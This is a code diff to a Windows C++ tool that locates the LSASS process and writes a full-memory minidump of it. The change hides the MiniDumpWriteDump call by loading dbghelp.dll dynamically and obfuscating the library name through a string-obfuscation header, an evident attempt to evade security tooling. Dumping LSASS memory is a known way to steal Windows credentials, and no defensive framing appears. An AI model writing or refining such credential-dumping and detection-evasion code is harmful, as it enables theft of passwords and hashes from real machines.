@@ -1,7 +1,22 @@
 #include "LsassDump.h"
 #include <tlhelp32.h>
 #include <dbghelp.h>
-#pragma comment(lib, "dbghelp.lib")
+#include "Obf.h"
+
+typedef BOOL (WINAPI *fpMiniDumpWriteDump)(HANDLE, DWORD, HANDLE, MINIDUMP_TYPE,
+    PMINIDUMP_EXCEPTION_INFORMATION, PMINIDUMP_USER_STREAM_INFORMATION, PMINIDUMP_CALLBACK_INFORMATION);
+
+static BOOL DynMiniDumpWriteDump(HANDLE hProc, DWORD pid, HANDLE hFile, MINIDUMP_TYPE dt,
+    PMINIDUMP_EXCEPTION_INFORMATION exc, PMINIDUMP_USER_STREAM_INFORMATION usr,
+    PMINIDUMP_CALLBACK_INFORMATION cb) {
+    static fpMiniDumpWriteDump fn = nullptr;
+    if (!fn) {
+        std::string dll = S("dbghelp.dll");
+        HMODULE h = LoadLibraryA(dll.c_str());
+        if (h) fn = (fpMiniDumpWriteDump)GetProcAddress(h, "MiniDumpWriteDump");
+    }
+    return fn ? fn(hProc, pid, hFile, dt, exc, usr, cb) : FALSE;
+}
 
 static DWORD FindLsassPid() {
     HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
@@ -64,7 +79,7 @@ std::string LsassDump::Dump(const std::string& outPath) {
         MiniDumpWithFullMemoryInfo   |
         MiniDumpWithThreadInfo);
 
-    BOOL ok = MiniDumpWriteDump(hProc, pid, hFile, dumpType, NULL, NULL, NULL);
+    BOOL ok = DynMiniDumpWriteDump(hProc, pid, hFile, dumpType, NULL, NULL, NULL);
 
     DWORD fileBytes = GetFileSize(hFile, NULL);
     CloseHandle(hFile);
